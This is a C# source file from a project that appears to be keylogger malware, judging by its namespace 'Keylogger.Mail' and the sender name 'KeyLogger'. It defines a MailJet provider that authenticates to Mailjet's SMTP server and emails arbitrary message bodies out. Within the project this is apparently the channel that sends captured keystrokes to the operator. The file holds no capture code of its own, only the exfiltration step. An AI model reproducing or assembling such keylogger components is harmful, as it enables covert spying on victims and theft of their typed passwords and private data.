using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger.Mail
{
    public class MailJet : IMailProvider
    {
        private string PublicKey;
        private string PrivateKey;

        public MailJet(string publicKey, string privateKey)
        {
            PublicKey = publicKey;
            PrivateKey = privateKey;
        }

        public void SendMail(string address, string subject, string message)
        {
            using (SmtpClient client = new SmtpClient())
            using (MailMessage mail = new MailMessage(new MailAddress(address, "KeyLogger"), new MailAddress(address)))
            {
                client.Port = 587;
                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(PublicKey, PrivateKey);
                client.Host = "in-v3.mailjet.com";
                client.SendCompleted += (sender, e) =>
                {
                    if (e.Error != null)
                        throw e.Error;
                };

                mail.Subject = subject;
                mail.Body = message;

                client.Send(mail);
            }
        }
    }
}
